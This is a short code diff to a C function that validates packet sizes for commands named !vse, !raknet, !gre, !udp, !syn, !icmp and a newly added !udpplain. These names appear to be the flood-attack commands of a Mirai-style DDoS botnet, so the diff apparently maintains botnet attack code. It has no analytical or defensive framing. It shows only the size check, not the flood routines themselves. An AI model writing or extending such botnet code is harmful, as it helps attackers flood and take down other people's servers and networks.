@@ -19,6 +19,7 @@ int validate_psize(int psize, const char *cmd) {
     if (strncmp(cmd, "!vse", 4) == 0 && psize > 1492) return 0;
     if (strncmp(cmd, "!raknet", 7) == 0 && psize > 1492) return 0;
     if (strncmp(cmd, "!gre", 4) == 0 && psize > 8192) return 0;
+    if (strncmp(cmd, "!udpplain", 9) == 0 && psize > 1450) return 0; 
     if ((strncmp(cmd, "!udp", 4) == 0 || strncmp(cmd, "!syn", 4) == 0 || strncmp(cmd, "!icmp", 5) == 0) && psize > 64500) return 0;
     return 1;
 }
